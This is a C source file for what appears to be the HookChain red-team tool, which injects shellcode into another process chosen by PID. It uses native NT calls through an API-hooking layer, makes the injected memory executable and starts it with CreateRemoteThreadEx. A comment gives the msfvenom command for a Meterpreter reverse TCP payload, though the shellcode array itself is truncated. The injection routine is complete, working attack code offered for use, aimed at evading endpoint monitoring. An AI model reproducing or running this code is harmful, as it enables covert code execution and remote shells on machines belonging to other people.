#pragma once

#include <stdio.h>
#include <Windows.h>

#include "hook.h"

INT wmain(int argc, char* argv[])
{
    NTSTATUS status;
    PVOID shellAddress = NULL;
    HANDLE hProcess = (HANDLE)-1;
    DWORD dwPID = 0;

    if (argc >= 2)
    {
        dwPID = _wtoi(argv[1]);
        if (dwPID == 0)
            dwPID = atoi(argv[1]);
    }

    if (dwPID == 0) {
        char cPid[7];

        printf("Type the pid: \n");
        fgets(cPid, sizeof(cPid), stdin);
        dwPID = _wtoi(cPid);
        if (dwPID == 0)
            dwPID = atoi(cPid);
    }

    if (dwPID == 0) {
        printf("[!] Failed to get PID\n");
        return 1;
    }

    printf("\n[+] Creating HookChain implants\n");
    if (!InitApi()) {
        printf("[!] Failed to initialize API\n");
        return 1;
    }

    printf("\n[+] HookChain implanted! \\o/\n\n");

    printf("[*] Creating Handle onto PID %d\n", dwPID);

    POBJECT_ATTRIBUTES objectAttributes = (POBJECT_ATTRIBUTES)RtlAllocateHeapStub(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(OBJECT_ATTRIBUTES));
    PCLIENT_ID clientId = (PCLIENT_ID)RtlAllocateHeapStub(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CLIENT_ID));
    clientId->UniqueProcess = dwPID;
    if (!NT_SUCCESS(NtOpenProcess(&hProcess, PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, objectAttributes, clientId))) {
        printf("[!] Failed to call OP: Status = 0x%08lx\n", GetLastError());
        return 1;
    }

    printf("[*] Allocating memory at Handle 0x%p with READ_WRITE permissions\n", hProcess);

    SIZE_T memSize = 0x1000;
    if (!NT_SUCCESS(NtAllocateVirtualMemory(hProcess, &shellAddress, 0, &memSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
        printf("[!] Failed to call VA(shellAddress) with READ_WRITE permissions: Status = 0x%08lx\n", GetLastError());
        return 1;
    }

    printf("[*] Injecting remote shellcode\n");

    // Example shellcode to be executed (this is just a placeholder, replace with actual shellcode)
    // msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=eth0 lport=4231 -f c
    unsigned char shellcode[] = {
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
        // ... rest of the shellcode
    };

    if (!WriteProcessMemory(hProcess, shellAddress, (LPCVOID)shellcode, sizeof(shellcode), NULL)) {
        printf("[!] Failed to call WriteProcessMemory(Shellcode): Status = 0x%08lx\n", GetLastError());
        return 1;
    }

    printf("[*] Changing memory permissions to READ_EXECUTE\n");

    ULONG oldProtect;
    if (!NT_SUCCESS(NtProtectVirtualMemory(hProcess, &shellAddress, &memSize, PAGE_EXECUTE_READ, &oldProtect))) {
        printf("[!] Failed to change memory permissions to READ_EXECUTE: Status = 0x%08lx\n", GetLastError());
        return 1;
    }

    printf("[*] Calling CreateRemoteThreadEx to execute the shellcode\n");
    HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)shellAddress, NULL, NULL, NULL, NULL);
    if (hThread == NULL) {
        printf("[!] Failed to call CRT: Status = 0x%08lx\n", GetLastError());
        return 1;
    }

    //Disable Hook prints
    SetDebug(FALSE);

    printf("[+] Shellcode OK!\n");
    printf("[+] Altered by Joas A Santos!\n");
    printf("\n\n _     _  _____   _____  _     _ _______ _     _ _______ _____ __   _\n |_____| |     | |     | |____/  |       |_____| |_____|   |   | \\  |\n |     | |_____| |_____| |    \\_ |_____  |     | |     | __|__ |  \\_|\n                                                          By M4v3r1ck\n\n");
    return 0x00;

}
